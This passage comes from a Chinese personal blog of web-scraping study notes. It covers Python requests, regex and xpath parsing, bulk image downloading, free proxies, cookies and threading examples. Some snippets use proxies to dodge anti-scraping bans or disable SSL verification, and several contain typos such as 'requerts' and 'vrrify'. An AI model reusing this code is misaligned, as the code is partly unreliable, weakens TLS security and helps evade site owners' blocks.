class=\"keyword\">in</span> json_list[<span class=\"string\">&quot;list&quot;</span>]:</span><br><span class=\"line\">            id_list.append(id_a[<span class=\"string\">&quot;ID&quot;</span>])</span><br><span class=\"line\">            <span class=\"comment\">#id_b是id号</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> id_b <span class=\"keyword\">in</span> id_list:</span><br><span class=\"line\">                data_2 = &#123;</span><br><span class=\"line\">                    <span class=\"string\">&quot;id&quot;</span>: <span class=\"built_in\">str</span>(id_b)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                detail_message = requests.post(url=url_2, data=data_2, headers=headers).json()</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(detail_message)</span><br><span class=\"line\">                message.append(detail_message)</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./药物信息.json&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">        json.dump(message, fp, ensure_ascii=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;end...&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;此代码爬取时间可能有些长，也有可能会出现Timeouterror错误，多试几次可能就可以了&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;出现这种情况的原因是对方服务器拒绝请求（反爬虫），，，后续继续学习反反爬虫技术&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"数据解析概述\"><a href=\"#数据解析概述\" class=\"headerlink\" title=\"数据解析概述\"></a>数据解析概述</h3><ul>\n<li>聚焦爬虫：爬取页面中指定的页面内容<pre><code>-编码流程\n    1、指定url\n    2、发起请求\n    3、获取相应数据\n    4、持久化存储\n    \n</code></pre>\n-数据解析分类：<pre><code>    -正则\n    -bs4\n    -xpath\n    \n</code></pre>\n-数据解析原理概述<pre><code>    -解析的局部的文本内容都会在标签之间或者标签对应的属性中进行存储\n    -1、进行指定标签的定位\n    -2、标签或者标签对应属性中存储的数据值进行提取（解析）\n</code></pre>\n</li>\n</ul>\n<h3 id=\"图片的爬取代码\"><a href=\"#图片的爬取代码\" class=\"headerlink\" title=\"图片的爬取代码\"></a>图片的爬取代码</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"comment\">#此处url为图片地址，而非链接【地址比链接短】</span></span><br><span class=\"line\">url = <span class=\"string\">&#x27;https://tse4-mm.cn.bing.net/th/id/OIP.vLPcBX_5hWArkIbn_PqvYgHaGL?w=233&amp;h=195&amp;c=7&amp;o=5&amp;dpr=1.25&amp;pid=1.7&#x27;</span></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;user-agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">#图片以二进制的形式存储，所以以.content形式接收，以jpg格式存</span></span><br><span class=\"line\">data_pict = requests.get(url=url, headers=headers).content</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./beauty_pict.jpg&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">    fp.write(data_pict)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"爬虫第四天\"><a href=\"#爬虫第四天\" class=\"headerlink\" title=\"爬虫第四天\"></a>爬虫第四天</h1><h3 id=\"爬取百度图片（星空图片）\"><a href=\"#爬取百度图片（星空图片）\" class=\"headerlink\" title=\"爬取百度图片（星空图片）\"></a>爬取百度图片（星空图片）</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\">#创建一个文件夹，存放图片</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(<span class=\"string\">&#x27;./star_sky&#x27;</span>):</span><br><span class=\"line\">        os.mkdir(<span class=\"string\">&#x27;./star_sky&#x27;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">    url = <span class=\"string\">&#x27;https://cn.bing.com/images/search?q=%E6%98%9F%E7%A9%BA%E5%9B%BE%E7%89%87&amp;qpvt=%e6%98%9f%e7%a9%ba%e5%9b%be%e7%89%87&amp;form=IGRE&amp;first=1&amp;cw=1117&amp;ch=714&#x27;</span></span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;user-agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    data_pict = requests.get(url=url, headers=headers).text</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#正则匹配</span></span><br><span class=\"line\">    ex = <span class=\"string\">&#x27;&lt;a class=.*?murl&amp;quot;:&amp;quot;(.*?)&amp;quot;.*?&gt;&#x27;</span></span><br><span class=\"line\">    star_list = re.findall(ex, data_pict, re.S)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> star_list:</span><br><span class=\"line\">        url_2 = i</span><br><span class=\"line\">        <span class=\"comment\">#请求到了图片的二进制数据</span></span><br><span class=\"line\">        data_2_pict = requests.get(url=url_2, headers=headers).content</span><br><span class=\"line\">        <span class=\"comment\">#为图片设置名称</span></span><br><span class=\"line\">        img_name = url_2.split(<span class=\"string\">&quot;/&quot;</span>)[-<span class=\"number\">1</span>]</span><br><span class=\"line\">        img_path = <span class=\"string\">&#x27;./star_sky/&#x27;</span> + img_name</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(img_path, <span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">            fp.write(data_2_pict)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(img_name + <span class=\"string\">&#x27;...successful&#x27;</span>)</span><br><span class=\"line\">        time.sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">****************************************未完，，待更新********************************************</span><br></pre></td></tr></table></figure>\n<h3 id=\"xpath\"><a href=\"#xpath\" class=\"headerlink\" title=\"xpath\"></a>xpath</h3><ul>\n<li>xpath解析：最常用且最便捷高效的一种解析方式，具有通用性<pre><code>-xpath解析原理：\n    -1、实例化一个etree对象，且需要将被解析的页面源码数据加载到该对象中\n    -2、调用etree对象中的xpath方法结合着xpath表达式实现标签的定位和内容的捕获\n-如何实例化一个etree对象\n    *from lxml import etree\n    -1、将 本地的html文档中的源代码数据加载到etree对象中：\n        etree.parse(filepath)\n    -2、可以将从互联网上获取的数据加载到该对象中\n        etree.HTML(&#39;page_text&#39;)###page_text就是获取的响应数据\n    - xpath(&#39;xpath表达式&#39;)\n    -xpath表达式：\n            - / ：表示的是从根目录结点开始定位，表示的是一个层级\n                    - // : 表示的是多个层级或从任意位置开始定位（前提是//前面没有结点）\n                    -属性定位：tag[@attrName=&quot;attrValue&quot;]\n                    -索引定位：p[n] 索引是从1开始的\n                    -取文本：\n        - /text() 获取的是标签中直系的文本内容\n        - //text() 标签中非直系的文本内容（所有的文本内容）\n        -[0] 可以去除列表框\n            -取属性\n        -/@attrName\n        \n</code></pre>\n</li>\n</ul>\n<h3 id=\"xpath代码实战示例：\"><a href=\"#xpath代码实战示例：\" class=\"headerlink\" title=\"xpath代码实战示例：\"></a>xpath代码实战示例：</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#爬取妹子图片，总共有俩千多张</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> lxml <span class=\"keyword\">import</span> etree</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    ii = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(<span class=\"string\">&#x27;./girl&#x27;</span>):</span><br><span class=\"line\">        os.mkdir(<span class=\"string\">&#x27;./girl&#x27;</span>)</span><br><span class=\"line\">    url_list = [i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">50</span>)]</span><br><span class=\"line\">    url_list[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> page <span class=\"keyword\">in</span> url_list:</span><br><span class=\"line\">        url = <span class=\"string\">&#x27;https://www.lanvshen.com/zhongguo/&#x27;</span> + <span class=\"built_in\">str</span>(page) +<span class=\"string\">&#x27;.html&#x27;</span></span><br><span class=\"line\">        headers = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;User-Agent&#x27;</span> : <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        get_text = requests.get(url=url, headers=headers)</span><br><span class=\"line\">        tree = etree.HTML(get_text.text)</span><br><span class=\"line\">        pict_ = tree.xpath(<span class=\"string\">&#x27;//div[@class=&quot;hezi&quot;]//li&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> it_ <span class=\"keyword\">in</span> pict_:</span><br><span class=\"line\">            img_url = it_.xpath(<span class=\"string\">&#x27;./a/img/@src&#x27;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            img_name = <span class=\"built_in\">str</span>(ii) + <span class=\"string\">&#x27;.jpg&#x27;</span></span><br><span class=\"line\">            img = requests.get(url=img_url, headers=headers).content</span><br><span class=\"line\">            img_path = <span class=\"string\">&#x27;./girl/&#x27;</span> + img_name</span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(img_path, <span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">                fp.write(img)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(img_name + <span class=\"string\">&#x27;sccuessful...&#x27;</span>)</span><br><span class=\"line\">            ii = ii + <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">##此代码存在许多不足之处，所爬取的图片都只是像素低的缩略图，并且下载速度较慢</span></span><br><span class=\"line\"><span class=\"comment\">##后期将学习爬取高清图片，并进行分布式爬取</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"ip代理\"><a href=\"#ip代理\" class=\"headerlink\" title=\"ip代理\"></a>ip代理</h3><ol>\n<li>代理的原理：在请求目的网站之前，先请求代理服务器，然后让代理服务器去请求目的网站，<br>代理服务器拿到目的网站的数据后，再转发给我们的代码</li>\n<li><a href=\"http://httpbin.org/\">这个网站可以方便的查看http请求的一些参数</a> </li>\n<li>在代码中(requests模块)使用代理：</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://httpbin.org&#x27;</span></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">\t<span class=\"string\">&#x27;User-Anget&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#设置代理</span></span><br><span class=\"line\">proxy = &#123;</span><br><span class=\"line\">\t<span class=\"string\">&#x27;http&#x27;</span>: <span class=\"string\">&#x27;123.54.194.96:38661&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">get_text = requerts.get(url=url, headers=headers, proxies=proxy).text</span><br><span class=\"line\"><span class=\"built_in\">print</span>(get_text)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>网络代理有付费和不需要付费的，不需要付费的不稳定，常常会失效</li>\n<li>代理的作用是防止我们在爬取服务器的数据时被反爬虫而被封禁导致我们<br>的 ip 不能用而采取的措施，选择代理应选择隐蔽性高，不透明的</li>\n</ol>\n<h3 id=\"cookie\"><a href=\"#cookie\" class=\"headerlink\" title=\"cookie\"></a>cookie</h3><ul>\n<li><p><a href=\"http://blog.sina.com.cn/s/blog_628571e601019uis.html\">cookie与session的差异</a></p>\n</li>\n<li><p><a href=\"http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=200538817&idx=2&sn=1147d48f2320fa37e82a7daef4f31c11#rd\">cookie技术深入</a>             </p>\n<ul>\n<li>Cookie是什么？     </li>\n</ul>\n<p>Cookie 是一小段文本信息，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。<br>Cookie 包含每次用户访问站点时 Web 应用程序都可以读取的信息。</p>\n<ul>\n<li><p>为什么需要Cookie？ </p>\n<p>因为HTTP协议是无状态的，对于一个浏览器发出的多次请求，WEB服务器无法区分 是不是来源于同一个浏览器。<br>所以，需要额外的数据用于维护会话。Cookie 正是这样的一段随HTTP请求一起被传递的额外数据。</p>\n</li>\n<li><p>Cookie能做什么？ </p>\n<p>Cookie只是一段文本，所以它只能保存字符串。而且浏览器对它有大小限制以及 它会随着每次请求被发送到服务器，所以应该保证它<br>不要太大。Cookie的内容也是明文保存的，有些浏览器提供界面修改，所以， 不适合保存重要的或者涉及隐私的内容。</p>\n</li>\n<li><p>Cookie 的限制</p>\n<p>大多数浏览器支持最大为 4096 字节的 Cookie。由于这限制了 Cookie 的大小，最好用 Cookie 来存储少量数据，<br>或者存储用户 ID 之类的标识符。用户 ID 随后便可用于标识用户，以及从数据库或其他数据源中读取用户信息。<br>浏览器还限制站点可以在用户计算机上存储的 Cookie 的数量。大多数浏览器只允许每个站点存储 20 个 Cookie；<br>如果试图存储更多 Cookie，则最旧的 Cookie 便会被丢弃。有些浏览器还会对它们将接受的来自所有站点的 Cookie<br>总数作出绝对限制，通常为 300 个。</p>\n</li>\n</ul>\n</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:/Users/Acer/Desktop/笔记/爬虫_day4_files/1.jpg\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"Cookie示意图\">    </p>\n<ul>\n<li>处理cookie<br>如果想要在多次请求中共享cookie，那么应该使用session</li>\n</ul>\n<h3 id=\"处理不信任的SSL证书\"><a href=\"#处理不信任的SSL证书\" class=\"headerlink\" title=\"处理不信任的SSL证书\"></a>处理不信任的SSL证书</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">resp = resquests.get(url=url, vrrify=<span class=\"literal\">False</span>).content</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"多线程\"><a href=\"#多线程\" class=\"headerlink\" title=\"多线程\"></a>多线程</h3><ul>\n<li>多线程之生产者与消费者模型</li>\n</ul>\n<ul>\n<li>代码示例一：(Lock版)</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">关于多线程生产者消费者模型</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"></span><br><span class=\"line\">gMoney = <span class=\"number\">1000</span></span><br><span class=\"line\">gLock = threading.Lock()</span><br><span class=\"line\">gTotalTimes = <span class=\"number\">10</span></span><br><span class=\"line\">gTimes = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 生产线程Producer</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Producer</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> gMoney</span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> gTimes</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\tmoney = random.randint(<span class=\"number\">100</span>, <span class=\"number\">1000</span>)</span><br><span class=\"line\">\t\t\tgLock.acquire()</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> gTimes &gt;= gTotalTimes:</span><br><span class=\"line\">\t\t\t\tgLock.release()</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\tgMoney += money</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#123;&#125;生产了&#123;&#125;元钱，剩余&#123;&#125;元钱&#x27;</span></span><br><span class=\"line\">\t\t\t\t  .<span class=\"built_in\">format</span>(threading.current_thread(), money, gMoney))</span><br><span class=\"line\">\t\t\tgTimes += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\tgLock.release()</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 消费线程Consumer</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Consumer</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> gMoney</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\tmoney = random.randint(<span class=\"number\">100</span>, <span class=\"number\">1000</span>)</span><br><span class=\"line\">\t\t\tgLock.acquire()</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> gMoney &gt;= money:</span><br><span class=\"line\">\t\t\t\tgMoney -= money</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#123;&#125;消费者消费了&#123;&#125;元钱，剩余&#123;&#125;元钱&#x27;</span></span><br><span class=\"line\">\t\t\t\t\t  .<span class=\"built_in\">format</span>(threading.current_thread(), money, gMoney))</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># 若剩余金额不足以消费，则退出循环</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> gTimes &gt;= gTotalTimes:</span><br><span class=\"line\">\t\t\t\t\tgLock.release()</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#123;&#125;消费者准备消费&#123;&#125;元钱，剩余&#123;&#125;元钱，不足！&#x27;</span></span><br><span class=\"line\">\t\t\t\t\t  .<span class=\"built_in\">format</span>(threading.current_thread(), money, gMoney))</span><br><span class=\"line\">\t\t\tgLock.release()</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">mainIt</span>():</span></span><br><span class=\"line\">\t<span class=\"comment\"># 设置3个消费线程</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">\t\tt = Consumer(name=<span class=\"string\">&#x27;消费者线程&#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(x))</span><br><span class=\"line\">\t\tt.start()</span><br><span class=\"line\">\t\t<span class=\"comment\"># 设置5个生产线程</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\tt = Producer(name=<span class=\"string\">&#x27;生产者线程&#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(x))</span><br><span class=\"line\">\t\tt.start()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\tmainIt()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>代码示例二：(condition版)</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">gMoney = <span class=\"number\">1000</span></span><br><span class=\"line\">gCondition = threading.Condition()  <span class=\"comment\"># 等同于threading.Lock</span></span><br><span class=\"line\">gTimes = <span class=\"number\">0</span></span><br><span class=\"line\">gTotalTimes = <span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Producer</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> gMoney</span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> gCondition</span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> gTimes</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\tmoney = random.randint(<span class=\"number\">100</span>, <span class=\"number\">1000</span>)</span><br><span 